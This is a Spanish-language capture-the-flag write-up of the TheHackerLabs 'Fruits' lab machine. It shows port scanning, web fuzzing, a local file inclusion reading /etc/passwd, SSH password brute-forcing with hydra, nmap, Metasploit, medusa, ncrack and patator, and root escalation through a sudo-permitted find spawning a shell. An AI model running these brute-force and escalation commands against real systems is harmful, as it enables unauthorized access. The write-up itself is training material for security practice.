---
title: "Fruits - TheHackerLabs"
date: 2025-01-02
draft: false
slug: "THL-writeup-fruits"
excerpt: "Es una máquina bastante sencilla. Después de identificar los puertos y servicios, analizamos el servicio HTTP activo, en donde aplicamos Fuzzing para identificar directorios y archivos ocultos, siendo que encontramos un archivo que nos permite aplicar LFI. El LFI nos permite ver el /etc/passwd, con lo que identificamos un usuario perteneciente al servicio SSH al que le aplicamos fuerza bruta con distintas herramientas, descubriendo su contraseña. Ya dentro del servicio SSH, revisando los privilegios de nuestro usuario, podemos usar el comando find como Root, lo que nos permite escalar privilegios para obtener una sesión del Root, usando la guía de GTFOBins."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "Apache", "SSH", "Web Enumeration", "Fuzzing", "Local File Inclusion (LFI)", "Brute Force Attack", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "BurpSuite"
  - "hydra"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: auxiliary/scanner/ssh/ssh_login"
  - "medusa"
  - "ncrack"
  - "patator"
  - "ssh"
  - "uname"
  - "sudo"
  - "find"
links:
  - "https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/"
  - "https://www-invicti-com.translate.goog/learn/local-file-inclusion-lfi/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc"
  - "https://book.hacktricks.wiki/en/generic-hacking/brute-force.html?highlight=ssh#ssh"
  - "https://exploit-notes.hdks.org/exploit/network/protocol/ssh-pentesting/"
  - "https://gtfobins.github.io/gtfobins/find/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-fruits/Fruits.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.20
PING 192.168.1.20 (192.168.1.20) 56(84) bytes of data.
64 bytes from 192.168.1.20: icmp_seq=1 ttl=64 time=1.79 ms
64 bytes from 192.168.1.20: icmp_seq=2 ttl=64 time=0.941 ms
64 bytes from 192.168.1.20: icmp_seq=3 ttl=64 time=0.869 ms
64 bytes from 192.168.1.20: icmp_seq=4 ttl=64 time=1.08 ms

--- 192.168.1.20 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 0.869/1.169/1.786/0.364 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.20 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 14:22 CST
Initiating ARP Ping Scan at 14:22
Scanning 192.168.1.20 [1 port]
Completed ARP Ping Scan at 14:22, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:22
Scanning 192.168.1.20 [65535 ports]
Discovered open port 22/tcp on 192.168.1.20
Discovered open port 80/tcp on 192.168.1.20
Completed SYN Stealth Scan at 14:22, 35.07s elapsed (65535 total ports)
Nmap scan report for 192.168.1.20
Host is up, received arp-response (0.00098s latency).
Scanned at 2025-01-02 14:22:16 CST for 36s
Not shown: 52473 filtered tcp ports (no-response), 13060 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: xx (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.28 seconds
           Raw packets sent: 124251 (5.467MB) | Rcvd: 13065 (522.604KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo que solamente hay dos puertos abiertos, y presiento que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.20 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 14:23 CST
Nmap scan report for 192.168.1.20
Host is up (0.00072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 ae:dd:1a:b6:db:a7:c7:8c:f3:03:b8:05:da:e0:51:68 (ECDSA)
|_  256 68:16:a7:3a:63:0c:8b:f6:ba:a1:ff:c0:34:e8:bf:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: P\xC3\xA1gina de Frutas
MAC Address: xx (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que están usando **Apache** para la página web del **puerto 80**, por lo que vamos a empezar por ahí.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-fruits/Captura1.png">
</p>

Parece ser un buscador.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-fruits/Captura2.png">
</p>

Interesante, parece que está utilizando **PHP**.

Si analizamos el código fuente, podemos ver que la página principal fue hecha en **PHP** y tramita **peticiones GET**:

<p align="center">
<img src="/assets/images/THL-writeup-fruits/Captura3.png">
</p>

Si buscamos algo, nos dará error:

<p align="center">
<img src="/assets/images/THL-writeup-fruits/Captura4.png">
</p>

Traté de aplicar **LFI** para ver si podía ver el `/etc/passwd`, pero fue inútil. Así que vamos a aplicar **Fuzzing**, para ver si hay algún archivo oculto por ahí y al estar usando **PHP**, lo enfocaremos en buscar esa clase de archivos.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://192.168.1.20/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.20/FUZZ.FUZ2Z
Total requests: 441118

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000027:   403        9 L      28 W       280 Ch      "php"                                                                                                                                           
000090479:   403        9 L      28 W       280 Ch      "php"                                                                                                                                           
000130607:   200        1 L      0 W        1 Ch        "fruits - php"                                                                                                                                  

Total time: 465.5974
Processed Requests: 441118
Filtered Requests: 441089
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar una lista de extensiones de archivos a buscar. |

Ahora probemos con **gobuster**:

```bash
gobuster dir -u http://192.168.1.20/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.20/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/fruits.php           (Status: 200) [Size: 1]
/server-status        (Status: 403) [Size: 280]
Progress: 661635 / 661638 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Parece que en ambos encontramos el archivo `/fruits.php`. Vamos a revisarlo.

## Explotación de Vulnerabilidades {#Explotacion}

### Analizando Archivo fruits.php y Probando si es Vulnerable a LFI {#HTTP2}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-fruits/Captura5.png">
</p>

No hay nada y si revisas su código fuente, tampoco encontrarás algo.

Veamos si con **BurpSuite** encontramos algo.

<p align="center">
<img src="/assets/images/THL-writeup-fruits/Captura6.png">
</p>

Nada de nada.

Algo que me intriga de este archivo, es que está realizando una **petición GET**. Es posible que podamos realizar un **LFI** por esta razón, así que vamos a intentarlo.

La siguiente página lo explica muy bien:
* <a href="https://www.invicti.com/learn/local-file-inclusion-lfi/" target="_blank">Local file inclusion (LFI)</a>

* Primero, usaremos el parámetro `?file=` para probar si podemos ver un archivo. Ponemos la ruta del archivo que queremos ver, que en este caso sería el `/etc/passwd` y lo ejecutamos:

<p align="center">
<img src="/assets/images/THL-writeup-fruits/Captura7.png">
</p>

Excelente, podemos ver el `/etc/passwd` y vemos un usuario llamado **bananaman** y que está activo el **servicio MySQL**.

Veamos si podemos aplicar fuerza bruta al usuario que encontramos.

### Aplicando Fuerza Bruta al Servicio SSH para Encontrar la Contraseña de un Usuario Utilizando Distintas Herramientas {#FuerzaBruta}

Vamos a usar distintas herramientas que existen, para aplicar fuerza bruta al **servicio SSH** y así podamos encontrar la contraseña del **usuario bananaman**.

#### Utilizando hydra Contra Servicio SSH {#Hydra}

Esta es mi herramienta preferida para aplicar fuerza bruta.

Vamos a usar nuestro wordlist nuclear **rockyou.txt**, por lo que puede tardar un poco en decirnos si encontró una contraseña válida:

```bash
hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20 -s 22
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-02 15:05:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.20:22/
[STATUS] 226.00 tries/min, 226 tries in 00:01h, 14344177 to do in 1057:50h, 12 active
[22][ssh] host: 192.168.1.20   login: bananaman   password: celtic
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-02 15:06:56
```
Muy bien, ya tenemos la contraseña del **usuario bananaman**.

Podemos probar si funciona:
```bash
ssh bananaman@192.168.1.20
The authenticity of host '192.168.1.20 (192.168.1.20)' can't be established.
ED25519 key fingerprint is SHA256:TF64A9yYMasdsa4PGrHQ7iMqmX8ai4/Cznc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.20' (ED25519) to the list of known hosts.
bananaman@192.168.1.20's password: 
Linux Fruits 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 27 17:46:39 2024 from 192.168.1.20
bananaman@Fruits:~$ whoami
bananaman
```
Genial, si funciona.

Vamos a probar otras herramientas que también nos pueden ser útiles para aplicar fuerza bruta.

#### Utilizando nmap Contra Servicio SSH {#Nmap}

No había probado esta opción, por lo que será interesante ver el resultado.

* Primero debemos guardar el nombre del usuario en un archivo de texto:
```bash  
nano users.txt
--------------
bananaman
```

* Usaremos el script `ssh-brute` de **nmap** para aplicar la fuerza bruta. Ahí, indicaremos nuestro archivo de texto y el **rockyou.txt**:
```bash
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt 192.168.1.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 15:40 CST
NSE: [ssh-brute] Trying username/password pair: bananaman:bananaman
NSE: [ssh-brute] Trying username/password pair: bananaman:123456
NSE: [ssh-brute] Trying username/password pair: bananaman:12345
NSE: [ssh-brute] Trying username/password pair: bananaman:123456789
NSE: [ssh-brute] Trying username/password pair: bananaman:password
NSE: [ssh-brute] Trying username/password pair: bananaman:iloveyou
...
...
...
NSE: [ssh-brute] Trying username/password pair: bananaman:celtic
Nmap scan report for 192.168.1.20
Host is up (0.00089s latency).
.
PORT   STATE SERVICE
22/tcp open  ssh

| ssh-brute: 
|   Accounts: 
|     bananaman:celtic - Valid credentials
|_  Statistics: Performed 251 guesses in 196 seconds, average tps: 1.5
MAC Address: xx (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 207.59 seconds
```
Excelente, obtuvimos el mismo resultado que con **hydra**.

#### Utilizando Módulo de Metasploit Contra Servicio SSH {#Metasploit}

Existe un módulo de **Metasploit Framework** que nos permite aplicar fuerza bruta. Vamos a usarlo:

* Vamos a iniciar **Metasploit** y buscaremos un **módulo ssh_login**, usaremos la opción `auxiliary/scanner/ssh/ssh_login`:

```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey  .                normal  No     SSH Public Key Login Scanner

Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey

msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) >
```

* Vamos a configurar las opciones para su uso:
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.20
RHOSTS => 192.168.1.20
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME bananaman
USERNAME => bananaman
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
```

* Y lo ejecutamos:
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > exploit
[*] 192.168.1.20:22 - Starting bruteforce
[+] 192.168.1.20:22 - Success: 'bananaman:celtic' 'uid=1001(bananaman) gid=1001(bananaman) grupos=1001(bananaman) Linux Fruits 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux'
[*] SSH session 1 opened (Tu_IP:39913 -> 192.168.1.20:22) at 2025-01-02 16:36:25 -0600
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Muy bien, el mismo resultado.

#### Utilizando medusa Contra Servicio SSH {#Medusa}

Esta herramienta es otra opción a considerar, pero es bastante lenta en comparación con **hydra, nmap y el módulo de Metasploit**:

Le agregué distintas flags para agilizar la fuerza bruta como **-n** (para que no aplique **resolución DNS**), **-t** (para incrementar los hilos a usar) y **-T** (para minimizar los retrasos):
```bash
medusa -u bananaman -P /usr/share/wordlists/rockyou.txt -h 192.168.1.20 -n -t 16 -T 10 -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 192.168.1.20 (1 of 1, 0 complete) User: bananaman (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.20 (1 of 1, 0 complete) User: bananaman (1 of 1, 0 complete) Password: 12345 (2 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.20 (1 of 1, 0 complete) User: bananaman (1 of 1, 0 complete) Password: 123456789 (3 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.20 (1 of 1, 0 complete) User: bananaman (1 of 1, 0 complete) Password: password (4 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.20 (1 of 1, 0 complete) User: bananaman (1 of 1, 0 complete) Password: iloveyou (5 of 14344391 complete)
...
...
...
ACCOUNT CHECK: [ssh] Host: 192.168.1.20 (1 of 1, 0 complete) User: bananaman (1 of 1, 0 complete) Password: crystal (249 of 14344391 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.20 (1 of 1, 0 complete) User: bananaman (1 of 1, 0 complete) Password: celtic (250 of 14344391 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.20 User: bananaman Password: celtic [SUCCESS]
```
Tardó alrededor de 5 minutos, pero obtuvimos nuestro resultado esperado.

#### Utilizando ncrack Contra Servicio SSH {#Ncrack}

Esta herramienta fue creada por los mismos creadores de **nmap**. Se me hizo sencilla de usar y tiene casi los mismos comandos que **nmap**, además fue casi igual de rápida que **hydra**:
```bash
ncrack -p ssh --user bananaman -P /usr/share/wordlists/rockyou.txt -vv -T5 192.168.1.20:22

Starting Ncrack 0.7 ( http://ncrack.org ) at 2025-01-02 15:52 CST

Stats: 0:00:04 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.00% done
Discovered credentials on ssh://192.168.1.20:22 'bananaman' 'celtic'
Stats: 0:02:23 elapsed; 0 services completed (1 total)
Rate: 8.18; Found: 1; About 0.01% done
(press 'p' to list discovered credentials)
Discovered credentials for ssh on 192.168.1.20 22/tcp:
192.168.1.20 22/tcp ssh: 'bananaman' 'celtic'
(press 'p' to list discovered credentials)
caught SIGINT signal, cleaning up
Saved current session state at: /root/.ncrack/restore.2025-01-02_15-56
```
Muy bien, solamente debes usar `CTRL + C` para terminar la sesión de uso de la herramienta.

#### Utilizando patator Contra Servicio SSH {#Patator}

Al igual que **ncrack** fue bastante sencilla y rápida de usar, pero no supe cómo impedir que siguiera probando contraseñas, por lo que debes hacer tú mismo y estar pendiente del resultado:
```bash
patator ssh_login host=192.168.1.20 user=bananaman password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
15:58:42 patator    INFO - Starting Patator 1.0 (https://github.com/lanjelot/patator) with python-3.12.8 at 2025-01-02 15:58 CST
15:58:42 patator    INFO -                                                                              
15:58:42 patator    INFO - code  size    time | candidate                          |   num | mesg
15:58:42 patator    INFO - -----------------------------------------------------------------------------
15:58:58 patator    INFO - 1     53     3.433 | andrew                             |    55 | Authentication failed: transport shut down or saw EOF
15:58:58 patator    INFO - 1     53     3.434 | playboy                            |    59 | Authentication failed: transport shut down or saw EOF
15:58:58 patator    INFO - 1     53     3.452 | angels                             |    56 | Authentication failed: transport shut down or saw EOF
15:58:58 patator    INFO - 1     53     3.437 | hello                              |    60 | Authentication failed: transport shut down or saw EOF
15:58:59 patator    INFO - 1     53     1.722 | amanda                             |    51 | Authentication failed: transport shut down or saw EOF
15:58:59 patator    INFO - 1     53     1.721 | loveyou                            |    52 | Authentication failed: transport shut down or saw EOF
...
...
...
15:59:55 patator    INFO - 1     53     3.437 | october                            |   236 | Authentication failed: transport shut down or saw EOF
15:59:56 patator    INFO - 0     38     0.101 | celtic                             |   250 | SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2
16:00:09 patator    INFO - 1     53     3.430 | natalie                            |   294 | Authentication failed: transport shut down or saw EOF
```
Aun así, obtuvimos el mismo resultado.

## Post Explotación {#Post}

### Enumeración de la Máquina y Escalando Privilegios con Comando find {#Root}

Antes que nada, me pico la curiosidad de cómo se pudo aplicar el **LFI**, por lo que al revisar el archivo **fruits.php** en la ruta `/var/www/html`, nos muestra lo siguiente:
```bash
bananaman@Fruits:~$ ls /var/www/html/
fruits.php  frutas.jpg  index.html
bananaman@Fruits:~$ cat /var/www/html/fruits.php
<?php
// Obtener el nombre del archivo solicitado desde el parámetro 'file'
$file = $_GET['file'];

// Verificar si el archivo solicitado es "/etc/passwd"
if ($file === '/etc/passwd') {
    // Mostrar el contenido del archivo /etc/passwd
    echo "<pre>";
    echo file_get_contents('/etc/passwd');
    echo "</pre>";
} 
// No hacer nada si el archivo solicitado no es "/etc/passwd"
?>
```
Parece que solamente nos dejaba ver el `/etc/passwd`.

Ahora sí, continuemos.

Veamos la información de la máquina.

Primero, obtengamos la flag del usuario, que podemos encontrar una vez entremos al **servicio SSH**:
```bash
bananaman@Fruits:~$ ls
user.txt
bananaman@Fruits:~$ cat user.txt
...
```

Ahora, obtengamos la información del sistema operativo:
```bash
bananaman@Fruits:~$ uname -a
Linux Fruits 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
```

Y, por último, obtengamos la versión del kernel:
```bash
bananaman@Fruits:~$ uname -r
6.1.0-18-amd64
```

Podríamos buscar un Exploit que se ajuste a esta distro, pero veamos los privilegios que tiene nuestro usuario primero.
```bash
bananaman@Fruits:~$ sudo -l
Matching Defaults entries for bananaman on Fruits:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bananaman may run the following commands on Fruits:
    (ALL) NOPASSWD: /usr/bin/find
```
Parece que podemos usar el **comando find**.

Ya me doy una idea de cómo escalar privilegios, pero primero quiero ver si no hay algún binario con **permisos SUID** del que nos podamos aprovechar:
```bash
bananaman@Fruits:~$ sudo find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
```
Como tal, no podemos usar ninguno más que el **comando find** para escalar privilegios.

Para hacerlo, vamos a utilizar la página **GTFOBins**: 
* <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank">GTFOBins: find</a>

Vamos a ejecutar el comando que nos indica para obtener una sesión del **Root**:
```bash
bananaman@Fruits:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
```
Genial, funcionó y la escalada fue muy rápida.

Ya solo obtengamos la flag que nos falta:
```bash
# cd /root
# ls
root.txt
# cat root.txt
...
```
Con esto, hemos completado la máquina.
